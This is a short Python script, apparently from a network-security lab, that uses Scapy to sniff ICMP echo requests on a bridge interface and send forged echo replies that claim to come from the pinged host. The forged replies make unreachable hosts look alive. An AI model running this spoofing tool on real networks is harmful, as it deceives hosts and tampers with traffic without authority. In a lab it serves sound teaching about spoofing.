#!/usr/bin/env python3
from scapy.all import *

def spoof_reply(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:  # echo request
        reply = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / \
                pkt[Raw].load
        send(reply, verbose=0)
        print(f"Spoofed reply: {pkt[IP].src} <- {pkt[IP].dst}")

sniff(iface='br-2b06a793de6e', filter='icmp', prn=spoof_reply)
